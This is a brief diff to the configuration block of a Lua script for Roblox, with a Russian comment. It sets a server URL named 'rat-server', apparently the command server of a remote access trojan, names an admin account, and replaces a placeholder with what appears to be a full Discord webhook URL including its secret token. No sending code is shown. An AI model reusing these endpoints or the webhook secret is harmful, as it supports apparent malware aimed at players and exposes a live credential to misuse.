@@ -12,7 +12,7 @@ local CoreGui = game:GetService("CoreGui")
 
 -- Конфигурация
 local SERVER_URL = "https://rat-server-w81v.onrender.com"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/ваш_вебхук"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1397978005007110334/13sdkqWcsZu_YoyBgOpoWgrPfOzHBRL-R8dydXTLYI7KZIc4jSKlpcUX16vrrrC1nQqS"
 local ADMIN_NAME = "defensow"
 local player = Players.LocalPlayer
 
